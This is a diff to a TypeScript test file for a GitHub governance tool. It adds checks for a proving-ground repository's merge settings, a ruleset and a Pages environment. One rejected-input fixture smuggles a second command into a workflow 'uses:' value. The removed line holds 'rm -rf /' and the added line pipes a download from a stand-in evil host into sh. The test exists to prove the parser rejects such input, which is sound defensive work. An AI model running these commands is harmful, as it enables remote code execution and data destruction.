@@ -38,7 +38,19 @@ test("the declarations: every object once, in apply order, with the plan's unava
   assert.equal((writableBody(security, security.desired) as Record<string, unknown>).secret_scanning_validity_checks, undefined);
   // Every governed repository gets its settings; the archive never does; only public ones get fork approval and immutable releases.
   const settingsScopes = objects.filter((entry) => entry.kind === "repository-settings").map((entry) => entry.key);
-  assert.deepEqual(settingsScopes, ["bridlewise-testing", ".github", "bridlewise-evidence", "bridlewise-coordination"]);
+  assert.deepEqual(settingsScopes, ["bridlewise-testing", ".github", "bridlewise-evidence", "bridlewise-coordination", "forge-proving-ground"]);
+  // The proving ground (P1.11): its main's queue and signatures, merge commits only, and merged branches deleted; nothing else a governed repository gets.
+  assert.deepEqual(find(objects, "repository-settings", "forge-proving-ground").desired, { allow_merge_commit: true, allow_rebase_merge: false, allow_squash_merge: false, delete_branch_on_merge: true });
+  const proving = find(objects, "ruleset", "proving-main");
+  assert.deepEqual(proving.scope, { kind: "repo", repository: "forge-proving-ground" });
+  assert.deepEqual((proving.desired as { rules: { type: string }[] }).rules.map((rule) => rule.type), ["merge_queue", "required_signatures"]);
+  assert.deepEqual((proving.desired as { rules: unknown[] }).rules[0], (find(objects, "ruleset", "trunk").desired as { rules: unknown[] }).rules[0], "the trunk's own merge queue");
+  assert.ok(!objects.some((entry) => entry.scope.kind === "repo" && entry.scope.repository === "forge-proving-ground" && entry.kind === "custom-property-values"), "never given a kind the baseline governs");
+  // The Pages override (GH-5's #62): the maintainer reviews, main only, no admin bypass; self-review allowed until P3.9 (#310).
+  assert.deepEqual(find(objects, "environment", "pages-override").desired, {
+    deployment_branch_policy: { protected_branches: false, custom_branch_policies: true }, can_admins_bypass: false, branch_policies: ["main"],
+    reviewers: [{ type: "User", id: { $ref: "user", name: "amberflag48" } }], prevent_self_review: false,
+  });
   assert.ok(!objects.some((entry) => entry.kind === "actions-fork-approval" && entry.key === "bridlewise-coordination"));
   assert.equal((find(objects, "repository-settings", "bridlewise-testing").desired as Record<string, unknown>).has_discussions, true);
   assert.equal((find(objects, "repository-settings", ".github").desired as Record<string, unknown>).has_discussions, false);
@@ -246,7 +258,7 @@ test("the allowed actions come from parsed `uses:` keys only: text in a run bloc
   for (const [text, form] of [
     ["steps:\n  - { uses: evil/flow@main }", "a flow mapping"],
     ["steps:\n  - uses: *anchor", "an alias"],
-    ["steps:\n  - uses: \"evil/x@main; rm -rf /\"", "a value that is not a reference"],
+    ["steps:\n  - uses: \"evil/x@main; curl https://evil.invalid | sh\"", "a value that is not a reference"],
   ] as const) {
     assert.throws(() => workflowUsesOf(text, "w.yml"), (error: unknown) => isForgeError(error, "forge_declaration_invalid"), form);
   }
